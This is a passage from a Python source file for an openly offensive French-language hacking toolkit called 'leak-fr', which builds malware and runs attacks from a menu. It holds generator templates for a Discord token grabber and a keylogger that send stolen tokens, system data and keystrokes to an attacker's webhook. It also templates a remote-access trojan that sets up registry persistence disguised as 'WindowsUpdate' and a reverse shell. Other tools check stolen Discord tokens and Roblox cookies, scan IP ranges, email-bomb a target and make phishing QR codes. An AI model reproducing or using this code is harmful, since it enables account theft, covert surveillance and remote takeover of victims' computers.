            print(f"  {R}[DEL]{RST}  {wh[:50]}  {r.status_code} ")
            time.sleep(0.2)
    pause()


def vip_grabber_gen():
    banner_s("DISCORD GRABBER GENERATOR")
    webhook = input(f"  {W}Webhook: {RST}").strip()
    out_name = input(f"  {W}Output filename: {RST}").strip() or "grabber.py"
    template = '''# -*- coding: utf-8 -*-
import os, re, json, socket, platform
from datetime import datetime
WEBHOOK = "__WEBHOOK__"
def get():
    try: import requests
    except Exception:
        import subprocess as sp
        sp.run(["pip", "install", "requests", "--quiet"], check=False)
        import requests
    appdata = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    paths = {"Discord": os.path.join(appdata, "Discord", "Local Storage", "leveldb"),
             "Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
             "Edge": os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")}
    pattern = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
    tokens = []
    for name, path in paths.items():
        if not os.path.isdir(path): continue
        for fname in os.listdir(path):
            if not fname.endswith((".log", ".ldb")): continue
            try:
                with open(os.path.join(path, fname), "r", errors="ignore") as f:
                    for tok in pattern.findall(f.read()):
                        if tok not in [t["token"] for t in tokens]:
                            r = requests.get("https://discord.com/api/v9/users/@me",
                                             headers={"Authorization": tok}, timeout=3)
                            if r.status_code == 200:
                                u = r.json()
                                tokens.append({"token": tok,
                                               "username": u.get("username"),
                                               "email": u.get("email", "N/A"),
                                               "nitro": u.get("premium_type", 0)})
            except Exception: pass
    try: pub_ip = requests.get("https://api.ipify.org", timeout=3).text.strip()
    except Exception: pub_ip = "?"
    try: user = os.getlogin()
    except Exception: user = "?"
    info = {"hostname": socket.gethostname(), "user": user,
            "os": platform.platform(), "ip": pub_ip,
            "datetime": str(datetime.now())[:19]}
    tok_str = ""
    for t in tokens[:5]:
        tok_str += f"**{t['username']}** | {t.get('email','?')} | Nitro:{t.get('nitro',0)}\\n`{t['token']}`\\n"
    embed = {"title": "leak-fr grabber -- Hit", "color": 0xFF0000, "fields": [
        {"name": "System", "value": f"```{json.dumps(info, indent=2)[:800]}```"},
        {"name": "Tokens", "value": tok_str[:1000] if tok_str else "None"}]}
    try: requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=8)
    except Exception: pass
get()
'''
    code = template.replace("__WEBHOOK__", webhook)
    os.makedirs("1-Output", exist_ok=True)
    with open(os.path.join("1-Output", out_name), "w", encoding="utf-8") as f:
        f.write(code)
    print(f"\n{OK} Grabber -> {Y}1-Output/{out_name}{RST}")
    builder_ask_format(os.path.join("1-Output", out_name))
    pause()


def vip_rat_builder():
    banner_s("RAT BUILDER")
    host = input(f"  {W}LHOST: {RST}").strip()
    port = input(f"  {W}LPORT: {RST}").strip() or "4444"
    out_name = input(f"  {W}Output filename: {RST}").strip() or "rat.py"
    code = f'''# -*- coding: utf-8 -*-
import os, socket, subprocess, platform, time, base64
HOST = "{host}"
PORT = {port}
def persist():
    try:
        import winreg
        script = os.path.abspath(__file__)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ,
                          f'python "{{script}}"')
        winreg.CloseKey(k)
    except Exception: pass
def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab(); path = "_ss.png"; img.save(path)
        with open(path, "rb") as f: data = base64.b64encode(f.read()).decode()
        os.remove(path); return data
    except Exception: return None
def shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.send(f"[leak-fr RAT] {{platform.node()}} | {{platform.system()}}\\n".encode())
            while True:
                cmd = s.recv(4096).decode().strip()
                if not cmd: continue
                if cmd.lower() == "exit": s.close(); break
                elif cmd.lower() == "screenshot":
                    ss = screenshot()
                    if ss: s.send(f"[SS]{{ss}}[/SS]\\n".encode())
                    else: s.send(b"Screenshot failed.\\n")
                elif cmd.lower() == "sysinfo":
                    info = f"OS: {{platform.platform()}}\\nUser: {{os.getlogin()}}\\nHost: {{platform.node()}}\\n"
                    s.send(info.encode())
                else:
                    out = subprocess.run(cmd, shell=True, capture_output=True, timeout=15)
                    s.send(out.stdout + out.stderr or b"(no output)\\n")
        except Exception: time.sleep(5)
persist()
shell()
'''
    os.makedirs("1-Output", exist_ok=True)
    with open(os.path.join("1-Output", out_name), "w", encoding="utf-8") as f:
        f.write(code)
    print(f"\n{OK} RAT -> {Y}1-Output/{out_name}{RST}")
    print(f"  {DIM}Listener: nc -lvnp {port}{RST}")
    builder_ask_format(os.path.join("1-Output", out_name))
    pause()


def vip_qr_phishing():
    banner_s("QR CODE PHISHING GENERATOR")
    try:
        import qrcode
    except Exception:
        pip("qrcode[pil]"); import qrcode
    url = input(f"  {W}URL: {RST}").strip()
    out = input(f"  {W}Output filename: {RST}").strip() or "qr_phishing"
    os.makedirs("1-Output", exist_ok=True)
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(url); qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    path = os.path.join("1-Output", f"{out}.png")
    img.save(path)
    print(f"\n{OK} QR Code -> {Y}{path}{RST}")
    pause()


def vip_mass_token_info():
    banner_s("MASS TOKEN INFO")
    path = input(f"  {W}Fichier .txt: {RST}").strip()
    if not os.path.isfile(path):
        print(f"{ERR} Introuvable. "); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        tokens = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} {len(tokens)} tokens...\n ")
    results = []
    for token in tokens:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers=_dh(token), timeout=4)
            if r.status_code == 200:
                d = r.json()
                guilds = requests.get("https://discord.com/api/v9/users/@me/guilds",
                                      headers=_dh(token), timeout=3).json()
                g_count = len(guilds) if isinstance(guilds, list) else 0
                line = (f"[VALID] {d.get('username')}#{d.get('discriminator','0')} | "
                        f"Email:{d.get('email','?')} | Guilds:{g_count} | {token}")
                print(f"  {G}[VALID]{RST}  {W}{d.get('username')}{RST}  Guilds:{g_count} ")
                results.append(line)
            else:
                print(f"  {R}[DEAD]{RST}  {DIM}{token[:35]}...{RST} ")
        except Exception:
            print(f"  {R}[ERR]{RST}   {DIM}{token[:35]}...{RST} ")
        time.sleep(0.3)
    if results: save_out("mass_token_info.txt", "\n".join(results))
    pause()


def vip_roblox_mass_checker():
    banner_s("ROBLOX COOKIE MASS CHECKER")
    path = input(f"  {W}Fichier cookies .txt: {RST}").strip()
    if not os.path.isfile(path):
        print(f"{ERR} Introuvable. "); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        cookies = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} {len(cookies)} cookies...\n ")
    valid = []
    for cookie in cookies:
        try:
            h = {"Cookie": f".ROBLOSECURITY={cookie}"}
            r = requests.get("https://users.roblox.com/v1/users/authenticated",
                             headers=h, timeout=5)
            if r.status_code == 200:
                d = r.json(); uid = d.get("id")
                robust = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency",
                                      headers=h, timeout=3).json()
                robux = robust.get("robux", 0)
                print(f"  {G}[HIT]{RST}  {W}{d.get('name')}{RST}  Robux:{G}{robux}{RST} ")
                valid.append(f"[HIT] {d.get('name')} | ID:{uid} | Robux:{robux} | {cookie}")
            else:
                print(f"  {R}[DEAD]{RST}  {DIM}{cookie[:40]}...{RST} ")
        except Exception:
            print(f"  {R}[ERR]{RST}   {DIM}{cookie[:40]}...{RST} ")
        time.sleep(0.3)
    if valid: save_out("roblox_hits.txt", "\n".join(valid))
    pause()


def vip_mass_ip_scan():
    banner_s("MASS IP SCANNER -- CIDR")
    cidr = input(f"  {W}CIDR (ex: 192.168.1.0/24): {RST}").strip()
    port = int(input(f"  {W}Port: {RST}").strip() or "80")
    try:
        import ipaddress
        network = ipaddress.ip_network(cidr, strict=False)
        hosts = list(network.hosts())
        print(f"\n{INF} {len(hosts)} IPs sur port {port}...\n ")
        found = []
        for ip in hosts:
            ip_str = str(ip)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip_str, port)) == 0:
                print(f"  {G}[OPEN]{RST}  {ip_str}:{port} ")
                found.append(f"{ip_str}:{port} ")
            s.close()
        if found: save_out(f"mass_scan_{cidr.replace('/','_')}.txt", "\n".join(found))
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def vip_email_bomber():
    banner_s("EMAIL BOMBER")
    target = input(f"  {W}Email cible: {RST}").strip()
    count = int(input(f"  {W}Nombre: {RST}").strip() or "10")
    print(f"\n{INF} Bombing {target} x{count}...\n ")
    sent = 0
    for i in range(1, count + 1):
        try:
            requests.post("https://app.mailjet.com/signup", data={"email": target}, timeout=3)
            sent += 1
        except Exception: pass
        print(f"  {Y}[{i}/{count}]{RST}  Requetes vers {target} ")
        time.sleep(0.5)
    print(f"\n{OK} {sent} requetes envoyees. ")
    pause()


def vip_keylogger_builder():
    banner_s("KEYLOGGER BUILDER")
    webhook = input(f"  {W}Webhook: {RST}").strip()
    interval = input(f"  {W}Intervalle (s): {RST}").strip() or "30"
    out_name = input(f"  {W}Output filename: {RST}").strip() or "keylogger.py"
    code = f'''# -*- coding: utf-8 -*-
import time, threading
WEBHOOK = "{webhook}"
INTERVAL = {interval}
_buffer = []
def on_key(key):
    try:
        from pynput.keyboard import Key
        if key == Key.space: _buffer.append(" ")
        elif key == Key.enter: _buffer.append("[ENTER]\\n")
        elif key == Key.backspace: _buffer.append("[BKSP]")
        elif key == Key.tab: _buffer.append("[TAB]")
        elif hasattr(key, "char") and key.char: _buffer.append(key.char)
        else: _buffer.append(f"[{{key}}]")
    except Exception: pass
def sender():
    import requests, socket, os
    while True:
        time.sleep(INTERVAL)
        if not _buffer: continue
        text = "".join(_buffer); _buffer.clear()
        try: user = os.getlogin()
        except Exception: user = "?"
        embed = {{"title": "leak-fr keylogger",
                  "color": 0xFF0000,
                  "fields": [
                    {{"name": "Host", "value": socket.gethostname(), "inline": True}},
                    {{"name": "User", "value": user, "inline": True}},
                    {{"name": "Keys", "value": f"```{{text[:1000]}}```"}}
                  ]}}
        try: requests.post(WEBHOOK, json={{"embeds": [embed]}}, timeout=5)
        except Exception: pass
def main():
    try: from pynput import keyboard
    except Exception:
        import subprocess as sp
        sp.run(["pip", "install", "pynput", "--quiet"], check=False)
        from pynput import keyboard
    t = threading.Thread(target=sender, daemon=True); t.start()
    with keyboard.Listener(on_press=on_key) as listener:
        listener.join()
main()
'''
    os.makedirs("1-Output", exist_ok=True)
    with open(os.path.join("1-Output", out_name), "w", encoding="utf-8") as f:
        f.write(code)
    print(f"\n{OK} Keylogger -> {Y}1-Output/{out_name}{RST}")
    print(f"  {DIM}pip install pynput{RST}")
    builder_ask_format(os.path.join("1-Output", out_name))
    pause()


# ========================================================================
# MAIN MENU -- Blue Magic
# ========================================================================
MAIN_CATEGORIES = [
    ("MALWARE BUILD", CAT_MALWARE, CAT_MALWARE_DARK, [
        ("01", "Virus Builder"),
        ("02", "HWID Spoofer"),
        ("03", "Discord Tools"),
        ("04", "VC Discord Tools"),
    ]),
    ("SCAN", CAT_SCAN, CAT_SCAN_DARK, [
        ("10", "Network Scanner"),
        ("11", "Web Tools"),
        ("12", "OSINT"),
    ]),
    ("PANEL & TOOLS", CAT_PANEL, CAT_PANEL_DARK, [
        ("20", "VIP Panel"),
        ("21", "Roblox Tools"),
        ("22", "Crypto Tools"),
        ("23", "Phone / SMS"),
        ("24", "Utilities"),
    ]),
    ("NETWORK / ATTACK", CAT_NETWORK, CAT_NETWORK_DARK, [
        ("30", "DDoS Stresser"),
        ("31", "DDoS Avance"),
    ]),
]


def _box_group(title, color_bright, color_dark, items, col_w=26):
    # Bordure sombre, titre vif
    head = f"{color_dark}┌─ {BOLD_ANSI}{color_bright}{title}{RESET_ANSI}{color_dark} "
    fill = max(0, col_w - len(title) - 4)
    head += ("─" * fill) + f"┐{RESET_ANSI}"
    foot = f"{color_dark}└" + ("─" * col_w) + f"┘{RESET_ANSI}"

    lines = [head]
    for k, label in items:
        item = f"{color_bright}[{k}]{RESET_ANSI} {W}{label}{RESET_ANSI}"
        vis = 4 + 1 + len(label)          # "[NN] " + label
        filln = max(0, col_w - vis - 1)
        lines.append(f"{color_dark}│{RESET_ANSI} {item}" + (" " * filln) + f"{color_dark}│{RESET_ANSI}")
    while len(lines) < 8:
        lines.append(f"{color_dark}│{RESET_ANSI}" + (" " * col_w) + f"{color_dark}│{RESET_ANSI}")
    lines.append(foot)
    return lines


def leakfr_main_menu():
    leakfr_banner()
    W = _term_w()
    boxes = [_box_group(t, c, cd, items)
             for t, c, cd, items in MAIN_CATEGORIES]
    max_h = max(len(b) for b in boxes)
    for b in boxes:
        while len(b) < max_h:
            b.append(" " * 28)

    # Largeur totale = 4 boîtes * 28 cols + 3 séparateurs de 2 espaces
    total_w = 4 * 28 + 3 * 2
    left_pad = max(0, (W - total_w) // 2)

    print()
    for i in range(max_h):
        print(" " * left_pad + "  ".join(_pad(b[i], 28) for b in boxes))

    hint = "» Selectionne une option  ·  0 = exit  ·  help"
    pad_hint = max(0, (W - len(hint)) // 2)
    print(f"\n{' ' * pad_hint}{BLOOD_MID}»{RESET_ANSI} "
          f"{BLOOD_PALE}Selectionne une option{RESET_ANSI}  "
          f"{GHOST}·  0 = exit  ·  help{RESET_ANSI}")


def main():
    while True:
        leakfr_main_menu()
        W = _term_w()
        prompt_pad = max(0, (W - 40) // 2)
        c = input(" " * prompt_pad + f"{BLOOD_BRIGHT}leak-fr >{RESET_ANSI} ").strip().lower()
        if c in ("0", "exit", "quit"):
            clr()
            W = _term_w()
            msg = "leak-fr · by 31300-leak-fr · a bientot."
            pad = max(0, (W - len(msg)) // 2)
            print(f"\n{' ' * pad}{BLOOD_LIGHT}leak-fr{RESET_ANSI} "
                  f"{GHOST}· by 31300-leak-fr · a bientot.{RESET_ANSI}\n")
            sys.exit(0)
        elif c in ("01", "1"):
            builder_menu()
        elif c in ("02", "2"):
            hwid_menu()
        elif c in ("03", "3"):
            discord_menu()
        elif c in ("04", "4"):
            vc_discord_menu()
        elif c == "10":
            net_menu()
        elif c == "11":
            web_menu()
        elif c == "12":
            osint_menu()
        elif c == "20":
            vip_menu()
        elif c == "21":
            roblox_menu()
        elif c == "22":
            crypto_menu()
        elif c == "23":
            phone_menu()
        elif c == "24":
            util_menu()
        elif c == "30":
            ddos_menu()
        elif c == "31":
            ddos_advanced_menu()
        elif c in ("help", "menu", "?"):
            continue
        else:
            print(f"  {BLOOD_MID}[leak-fr]{RESET_ANSI} option {c} inconnue.")
            time.sleep(0.6)

# ========================================================================
# ENTRY
# ========================================================================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.stdout.write(RESET_ANSI + "\n")
        print(f"\n  {BLOOD_LIGHT}leak-fr{RESET_ANSI} "
              f"{GHOST}· interrupted · by 31300-leak-fr{RESET_ANSI}\n")
        sys.exit(0)
